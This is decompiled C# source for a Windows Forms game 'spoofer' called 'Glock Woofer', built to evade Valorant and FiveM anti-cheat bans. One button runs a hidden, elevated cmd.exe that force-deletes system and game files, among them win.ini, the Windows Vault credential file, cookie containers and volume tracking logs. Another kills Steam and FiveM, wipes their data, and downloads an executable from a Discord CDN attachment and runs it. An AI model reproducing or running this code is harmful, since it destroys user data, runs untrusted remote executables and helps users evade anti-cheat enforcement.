using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Windows.Forms;
using Auth.GG_Winform_Example;
using Siticone.UI.WinForms;
using Test2;
using Test3;

namespace Test
{
	// Token: 0x02000008 RID: 8
	public partial class Loader : Form
	{
		// Token: 0x0600004D RID: 77 RVA: 0x000087C8 File Offset: 0x000069C8
		public Loader()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600004E RID: 78 RVA: 0x000087E0 File Offset: 0x000069E0
		public void musicv1()
		{
			WebClient webClient = new WebClient();
			string tempPath = Path.GetTempPath();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/931203518612766742/946734107889655828/music.wav", tempPath + this.grwXIswrPv + ".mp3");
			new SoundPlayer(tempPath + this.grwXIswrPv + ".mp3").Play();
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00008834 File Offset: 0x00006A34
		private void siticoneRoundedButton14_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C del /f \"C:\\Windows\\win.ini\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Manifest_NonUFSFiles_Win64.txt\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\Plugins\\plugin - manifest.json\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\natives_blob.bin\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Vault\\UserProfileRoaming\\Latest.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\AC\\INetCookies\\ESE\\container.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\UnrealEngine\\4.23\\Saved\\Config\\WindowsClient\\Manifest.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\DeviceHealthSummaryConfiguration.ini\" && del /f \"C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx\" && del /f \"C:\\Users\\%username%\\ntuser.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat\" && del /f \"C:\\System Volume Information\\tracking.log\" && del /f \"D:\\System Volume Information\\tracking.log\""
				}
			}.Start();
			this.musicv1();
			MessageBox.Show("Spoofed Valorant", "Glock Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000088D0 File Offset: 0x00006AD0
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000051 RID: 81 RVA: 0x000088D4 File Offset: 0x00006AD4
		private void siticoneRoundedButton21_Click(object sender, EventArgs e)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string processName = "FiveM";
			string processName2 = "Steam";
			Process process = Process.GetProcessesByName(processName).FirstOrDefault<Process>();
			bool flag = process != null;
			if (flag)
			{
				process.CloseMainWindow();
				process.Kill();
				process.WaitForExit();
				process.Dispose();
			}
			Process process2 = Process.GetProcessesByName(processName2).FirstOrDefault<Process>();
			bool flag2 = process2 != null;
			if (flag2)
			{
				process2.CloseMainWindow();
				process2.Kill();
				process2.WaitForExit();
				process2.Dispose();
			}
			bool flag3 = !File.Exists(folderPath + "\\FiveM\\FiveM.exe");
			if (flag3)
			{
				Console.Beep();
				MessageBox.Show("Failed To Clean", "Glock Woofer - FiveM", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				DialogResult dialogResult = MessageBox.Show("Do you want to fix it for you?", "Glock Woofer", MessageBoxButtons.YesNo);
				bool flag4 = dialogResult == DialogResult.Yes;
				if (flag4)
				{
					bool flag5 = Directory.Exists(folderPath + "\\FiveM");
					if (flag5)
					{
						Directory.Delete(folderPath + "\\FiveM", false);
					}
					bool flag6 = !Directory.Exists(folderPath + "\\FiveM");
					if (flag6)
					{
						Directory.CreateDirectory(folderPath + "\\FiveM");
					}
					using (WebClient webClient = new WebClient())
					{
						webClient.DownloadFile("https://cdn.discordapp.com/attachments/950112367767851102/962261956880891924/FiveM.exe", folderPath + "\\FiveM\\FiveM.exe");
						Process.Start(folderPath + "\\FiveM\\FiveM.exe");
						MessageBox.Show("FiveM Downloaded and Started");
					}
				}
			}
			else
			{
				bool flag7 = Directory.Exists(folderPath + "\\DigitalEntitlements");
				if (flag7)
				{
					Directory.Delete(folderPath + "\\DigitalEntitlements", true);
				}
				bool flag8 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\crashes");
				if (flag8)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\crashes", true);
				}
				bool flag9 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\logs");
				if (flag9)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\logs", true);
				}
				bool flag10 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\data\\cache");
				if (flag10)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\data\\cache", true);
				}
				bool flag11 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\data\\server-cache");
				if (flag11)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\data\\server-cache", true);
				}
				bool flag12 = Directory.Exists(folderPath2 + "\\CitizenFX");
				if (flag12)
				{
					Directory.Delete(folderPath2 + "\\CitizenFX", true);
				}
				this.musicv1();
				MessageBox.Show("Successfully Cleaned FiveM", "Glock Woofer - FiveM", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00008B9C File Offset: 0x00006D9C
		private void siticoneRoundedButton19_Click(object sender, EventArgs e)
		{
			Main main = new Main();
			main.Show();
			base.Hide();
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00008BC0 File Offset: 0x00006DC0
		private void siticoneRoundedButton15_Click(object sender, EventArgs e)
		{
			Login login = new Login();
			login.Show();
			base.Hide();
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00008BE2 File Offset: 0x00006DE2
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00008BEB File Offset: 0x00006DEB
		private void siticoneControlBox2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00008BEE File Offset: 0x00006DEE
		private void Loader_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00008BF1 File Offset: 0x00006DF1
		private void siticoneRoundedButton18_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00008BF4 File Offset: 0x00006DF4
		private void siticoneRoundedButton17_Click(object sender, EventArgs e)
		{
			SystemSpoofer systemSpoofer = new SystemSpoofer();
			systemSpoofer.Show();
			base.Hide();
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00008C16 File Offset: 0x00006E16
		private void siticoneRoundedButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00008C1C File Offset: 0x00006E1C
		private void siticoneRoundedButton16_Click(object sender, EventArgs e)
		{
			Loader loader = new Loader();
			loader.Show();
			base.Hide();
		}

		// Token: 0x0400003E RID: 62
		private string grwXIswrPv;
	}
}
